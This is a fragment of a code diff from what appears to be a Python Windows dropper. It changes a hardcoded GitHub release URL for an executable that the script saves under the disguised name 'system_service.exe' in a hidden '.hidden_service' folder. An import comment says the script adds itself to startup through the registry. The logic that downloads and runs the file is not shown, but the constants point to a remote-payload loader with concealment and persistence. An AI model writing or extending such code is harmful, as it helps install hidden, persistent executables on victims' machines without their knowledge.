@@ -6,7 +6,7 @@ from pathlib import Path
 import winreg  # For adding to startup
 
 # Hardcoded values
-URL = "https://github.com/yesjdnke/manager/releases/download/love/main.exe"  # Replace with your URL
+URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"  # Replace with your URL
 FOLDER_NAME = ".hidden_service"
 FILE_NAME = "system_service.exe"
 HASH_FILE_NAME = "file_hash.txt"  # To store the hash of the downloaded file
